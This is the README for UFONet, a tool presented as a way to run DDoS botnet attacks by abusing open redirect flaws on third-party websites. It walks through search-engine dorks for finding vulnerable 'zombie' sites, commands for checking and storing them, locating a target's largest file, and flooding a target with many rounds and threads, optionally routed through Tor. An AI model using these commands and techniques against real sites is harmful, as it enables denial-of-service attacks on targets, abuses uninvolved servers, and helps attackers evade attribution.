=========================================================================== 

888     888 8888888888 .d88888b.  888b    888          888    
888     888 888        d88PY888b  8888b   888          888    
888     888 888       888     888 88888b  888          888    
888     888 8888888   888     888 888Y88b 888  .d88b.  888888 
888     888 888       888     888 888 Y88b888 d8P  Y8b 888    
888     888 888       888     888 888  Y88888 88888888 888    
Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  
 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888

UFONet - DDoS Botnet via Web Abuse - by psy 

=========================================================================== 

###############################
# Project info
###############################

Website: http://ufonet.03c8.net

IRC: irc.freenode.net - #ufonet

###############################
# Summary
###############################

UFONet - is a tool designed to launch DDoS Botnet against a target, 
using 'Open Redirect' vectors on third party web applications like botnet.

See this links for more info:

   - CWE-601:Open Redirect: 
     http://cwe.mitre.org/data/definitions/601.html

   - OWASP:URL Redirector Abuse: 
     https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2

###############################
# Installing
###############################

  UFONet runs on many platforms.  It requires Python (2.x.y) and the following libraries:

       python-pycurl - Python bindings to libcurl
       python-geoip  - Python bindings for the GeoIP IP-to-country resolver library

  On Debian-based systems (ex: Ubuntu), run: 

       sudo apt-get install python-pycurl python-geoip

  Source libs:

       * Python: https://www.python.org/downloads/
       * PyCurl: http://pycurl.sourceforge.net/
       * PyGeoIP: https://pypi.python.org/pypi/GeoIP/

###############################
# Searching for 'zombies'
###############################

UFONet can dig on different search engines results to find possible 'Open Redirect' vulnerable sites. 
A common query string should be like this:

        'proxy.php?url='
        'check.cgi?url='
        'checklink?uri='
        'validator?uri='

For example you can begin a search with:

       ./ufonet -s 'proxy.php?url='

Or providing a list of "dorks" from a file:

       ./ufonet --sd 'dorks.txt'

By default UFONet will uses a search engine called 'duck'. But you can choose a different one:

       ./ufonet -s 'proxy.php?url=' --se 'bing'

This is the list of available search engines with last time that were working:

        - duck [07/10/2015: OK!]
        - google [07/10/2015: OK!]
        - bing [07/10/2015: OK!]
        - yahoo [07/10/2015: OK!]
        - yandex [07/10/2015: OK!]

You can also search massively using all search engines supported:

       ./ufonet -s 'proxy.php?url=' --sa 

To control how many 'zombies' recieve from search engines you can use:

       ./ufonet --sd 'dorks.txt' --sa --sn 20

At the end of the process, you will be asked if you want to check the list retrieved to see 
if the urls are vulnerable.

       Wanna check if they are valid zombies? (Y/n)

Also, you will be asked to update the list adding automatically only 'vulnerable' web apps.

       Wanna update your list (Y/n)

If you reply 'Y' your new 'zombies' will be appended to the file named: zombies.txt

  -------------
  Examples:

     + with verbose:       ./ufonet -s 'proxy.php?url=' -v
     + with threads:       ./ufonet --sd 'dorks.txt' --sa --threads 100

###############################
# Testing botnet
###############################

Open 'zombies.txt' (or another file) and create a list of possible 'zombies'. 
Urls of the 'zombies' should be like this:

       http://target.com/check?uri=

After that, launch it:

       ./ufonet -t zombies.txt

You can order to 'zombies' to attack you and see how they reply to your needs using:

       ./ufonet --attack-me 

At the end of the process you will be asked if you want to update the list 
adding automatically only 'vulnerable' web apps.

       Wanna update your list (Y/n)

If you reply 'Y', your file: zombies.txt will be updated.

  -------------
  Examples:

     + with verbose:     ./ufonet -t zombies.txt -v
     + with proxy TOR:   ./ufonet -t zombies.txt --proxy="http://127.0.0.1:8118"
     + with threads:     ./ufonet -t zombies.txt --threads 50

###############################
# Inspecting a target
###############################

This feature will provides you the biggest file on target:

       ./ufonet -i http://target.com

You can use this when attacking to be more effective:

       ./ufonet -a http://target.com -b "/biggest_file_on_target.xxx"

  -------------
  Example:

    +input:

       ./ufonet -i http://target.com

    +output:

       [...]

        +Image found: images/wizard.jpg
	(Size: 63798 Bytes)
	------------
	+Style (.css) found: fonts.css
	(Size: 20448 Bytes)
	------------
	+Webpage (.php) found: contact.php
	(Size: 2483 Bytes)
	------------
	+Webpage (.php) found: about.php
	(Size: 1945 Bytes)
	------------
	+Webpage (.php) found: license.php
	(Size: 1996 Bytes)
	------------
	================================================================================
	=Biggest File: http://target.com/images/wizard.jpg
	================================================================================

###############################
# Attacking a target
###############################

Enter a target to attack with a number of rounds:

       ./ufonet -a http://target.com -r 10

On this example UFONet will attacks the target a number of 10 times for each 'zombie'. That means that 
if you have a list of 1.000 'zombies' it will launchs 1.000 'zombies' x 10 rounds = 10.000 requests to the target.

By default if you don't put any round it will apply only 1.

Additionally, you can choose a place to recharge on target's site. For example, a large image, 
a big size file or a flash movie. In some scenarios where targets doesn't use cache systems 
this will do the attack more effective.

       ./ufonet -a http://target.com -b "/images/big_size_image.jpg"

  -------------
  Examples:

     + with verbose:     ./ufonet -a http://target.com -r 10 -v
     + with proxy TOR:   ./ufonet -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
     + with a place:     ./ufonet -a http://target.com -r 10 -b "/images/big_size_image.jpg"
     + with threads:     ./ufonet -a http://target.com -r 10 --threads 500

###############################
# Updating
###############################

UFONet implements an option to update the tool to the latest stable version.

This feature can be used only if you have cloned it from GitHub respository.

To check your version you should launch:

       ./ufonet --update

This will update the tool automatically removing all files from old package.

###############################
# GUI/Web Interface
###############################

You can manage UFONet using a Web interface. The tool has implemented a python web server 
connected to the core to provides you a more user friendly experience.

To launch it use:

      ./ufonet --gui

This will open a tab on your default browser with all features of the tool and some 'extra' options.

###############################
# Timelog
###############################

--------------------------
05.11.2015 : v.0.6b
--------------------------

--------------------------
24.05.2015 : v.0.5b
--------------------------

--------------------------
15.12.2014 : v.0.4b
--------------------------

--------------------------
27.09.2014 : v.0.3.1b
--------------------------

--------------------------
20.09.2014 : v.0.3b
--------------------------

--------------------------
22.06.2013 : v.0.2b
--------------------------

--------------------------
18.06.2013 : v.0.1b
--------------------------

###############################
# Thanks to
###############################

- UFo & Mandingo & Ikujam
------------------------

############
